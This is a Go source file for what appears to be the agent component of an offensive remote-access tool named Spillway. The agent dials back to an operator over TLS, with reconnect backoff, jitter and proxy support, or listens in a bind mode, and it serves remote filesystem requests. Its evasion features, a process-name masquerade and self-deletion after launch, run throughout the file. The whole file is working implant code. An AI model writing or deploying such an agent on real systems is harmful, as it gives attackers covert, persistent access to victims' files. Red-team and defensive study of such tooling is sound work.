package agent

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"runtime"
	"time"

	"github.com/Real-Fruit-Snacks/Spillway/internal/protocol"
	"github.com/Real-Fruit-Snacks/Spillway/internal/transport"
)

// Config holds all configuration for an Agent instance.
type Config struct {
	// Mode is either "reverse" (agent dials out) or "bind" (agent listens).
	Mode string

	// Address is host:port to dial (reverse) or listen on (bind).
	Address string

	// PSK is the pre-shared key used for authentication.
	PSK []byte

	// TLSFingerprint is the expected SHA-256 fingerprint of the listener's
	// TLS certificate (hex, reverse mode only).
	TLSFingerprint string

	// SNI is the TLS server name to use when dialing (reverse mode only).
	SNI string

	// Root is the filesystem jail root directory.
	Root string

	// Excludes are absolute path prefixes forbidden within the jail.
	Excludes []string

	// ProcName is the name to masquerade as in the process list.
	ProcName string

	// SelfDelete causes the binary to delete itself after startup.
	SelfDelete bool

	// RateLimit is the token bucket rate in bytes/sec (0 = unlimited).
	RateLimit float64

	// RateBurst is the token bucket burst capacity.
	RateBurst int

	// ProxyAddr is an optional HTTP/SOCKS proxy address (reverse mode only).
	ProxyAddr string

	// ProxyUser and ProxyPass are optional proxy credentials.
	ProxyUser string
	ProxyPass string

	// ReadOnly rejects all write operations at the agent level.
	ReadOnly bool
}

// Agent is the main agent orchestrator.
type Agent struct {
	cfg  Config
	jail *PathJail
}

// New creates a new Agent with the given configuration.
func New(cfg Config) *Agent {
	return &Agent{cfg: cfg}
}

// Run initialises the agent and enters the main connection loop.
// It returns only when ctx is cancelled or a fatal error occurs.
func (a *Agent) Run(ctx context.Context) error {
	initOpsec(a.cfg.ProcName, a.cfg.SelfDelete)

	a.jail = NewPathJail(a.cfg.Root, a.cfg.Excludes)

	switch a.cfg.Mode {
	case "bind":
		return a.runBind(ctx)
	default: // "reverse"
		return a.runReverse(ctx)
	}
}

// runReverse dials the listener with exponential backoff and reconnects on
// connection loss until ctx is cancelled.
func (a *Agent) runReverse(ctx context.Context) error {
	backoff := time.Second
	const maxBackoff = 5 * time.Minute

	for {
		conn, err := a.dialReverse(ctx)
		if err != nil {
			if ctx.Err() != nil {
				return ctx.Err()
			}
			sleep := jitter(backoff)
			select {
			case <-ctx.Done():
				return ctx.Err()
			case <-time.After(sleep):
			}
			backoff = minDuration(backoff*2, maxBackoff)
			continue
		}

		// Reset backoff on successful connection.
		backoff = time.Second

		if err := a.serveConn(ctx, conn); err != nil {
			if ctx.Err() != nil {
				return ctx.Err()
			}
			// Connection dropped — loop and reconnect.
			continue
		}
		return nil
	}
}

// runBind listens for a single incoming connection, serves it, then exits.
func (a *Agent) runBind(ctx context.Context) error {
	conn, err := a.listenBind(ctx)
	if err != nil {
		return err
	}
	return a.serveConn(ctx, conn)
}

// serveConn authenticates and runs a ServerMux over conn until it closes.
func (a *Agent) serveConn(ctx context.Context, conn *transport.FramedConn) error {
	defer conn.Close()

	// Set a deadline for authentication to prevent hanging connections.
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	// Authenticate: in reverse mode the agent performs auth; in bind mode it
	// validates the incoming auth from the listener.
	var authErr error
	if a.cfg.Mode == "bind" {
		authErr = transport.ValidateAuth(conn, a.cfg.PSK)
	} else {
		authErr = transport.PerformAuth(conn, a.cfg.PSK)
	}
	if authErr != nil {
		return fmt.Errorf("auth: %w", authErr)
	}

	// Clear auth deadline.
	conn.SetDeadline(time.Time{})

	// Zero the PSK from memory after auth. Only safe in bind mode
	// (single-session); reverse mode may reconnect and needs the PSK again.
	if a.cfg.Mode == "bind" {
		for i := range a.cfg.PSK {
			a.cfg.PSK[i] = 0
		}
		runtime.KeepAlive(&a.cfg.PSK)
	}

	mux := transport.NewServerMux(conn, a.handleRequest)

	if a.cfg.RateLimit > 0 {
		burst := a.cfg.RateBurst
		if burst <= 0 {
			burst = int(a.cfg.RateLimit)
		}
		mux.SetRateLimiter(NewTokenBucket(a.cfg.RateLimit, burst))
	}

	go mux.Run()

	select {
	case <-ctx.Done():
		mux.Close()
		return ctx.Err()
	case <-mux.Done():
		return nil
	}
}

// handleRequest is the ServerMux callback — dispatches to filesystem ops or
// answers control messages inline.
func (a *Agent) handleRequest(req *protocol.Request) *protocol.Response {
	if req.Type == protocol.MsgPing {
		return &protocol.Response{Type: protocol.MsgPong, ID: req.ID}
	}
	return dispatchRequest(req, a.jail, a.cfg.ReadOnly)
}

// dialReverse establishes a TLS connection to cfg.Address, optionally via a
// proxy, and wraps it in a FramedConn.
func (a *Agent) dialReverse(ctx context.Context) (*transport.FramedConn, error) {
	tlsCfg := transport.AgentTLSConfig(a.cfg.SNI, a.cfg.TLSFingerprint)

	var rawConn net.Conn
	var err error

	if a.cfg.ProxyAddr != "" {
		rawConn, err = transport.DialViaProxy(a.cfg.ProxyAddr, a.cfg.Address, a.cfg.ProxyUser, a.cfg.ProxyPass)
		if err != nil {
			return nil, fmt.Errorf("proxy dial: %w", err)
		}
		// Perform TLS handshake over the proxied TCP connection.
		tlsConn := tls.Client(rawConn, tlsCfg)
		if err = tlsConn.HandshakeContext(ctx); err != nil {
			rawConn.Close()
			return nil, fmt.Errorf("tls handshake: %w", err)
		}
		rawConn = tlsConn
	} else {
		dialer := &tls.Dialer{Config: tlsCfg}
		rawConn, err = dialer.DialContext(ctx, "tcp", a.cfg.Address)
		if err != nil {
			return nil, err
		}
	}

	return transport.NewFramedConn(rawConn), nil
}

// listenBind creates a TLS listener on cfg.Address, accepts one connection,
// and returns it as a FramedConn.
func (a *Agent) listenBind(ctx context.Context) (*transport.FramedConn, error) {
	// Bind mode: we need a cert. For now we generate a self-signed cert or
	// expect the caller to have embedded one. Use a placeholder approach:
	// generate an ephemeral self-signed cert.
	certPEM, keyPEM, err := generateSelfSigned()
	if err != nil {
		return nil, fmt.Errorf("tls cert: %w", err)
	}

	tlsCfg, err := transport.ListenerTLSConfig(certPEM, keyPEM)
	if err != nil {
		return nil, fmt.Errorf("tls config: %w", err)
	}

	ln, err := tls.Listen("tcp", a.cfg.Address, tlsCfg)
	if err != nil {
		return nil, err
	}
	defer ln.Close()

	// Accept exactly one connection (bind mode is single-session).
	type result struct {
		conn net.Conn
		err  error
	}
	ch := make(chan result, 1)
	go func() {
		c, e := ln.Accept()
		ch <- result{c, e}
	}()

	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	case r := <-ch:
		if r.err != nil {
			return nil, r.err
		}
		return transport.NewFramedConn(r.conn), nil
	}
}

// --- helpers ---

func jitter(d time.Duration) time.Duration {
	// ±30% jitter. math/rand is fine here — not security-sensitive.
	delta := float64(d) * 0.3
	offset := (rand.Float64()*2 - 1) * delta //nolint:gosec
	return time.Duration(float64(d) + offset)
}

func minDuration(x, y time.Duration) time.Duration {
	if x < y {
		return x
	}
	return y
}
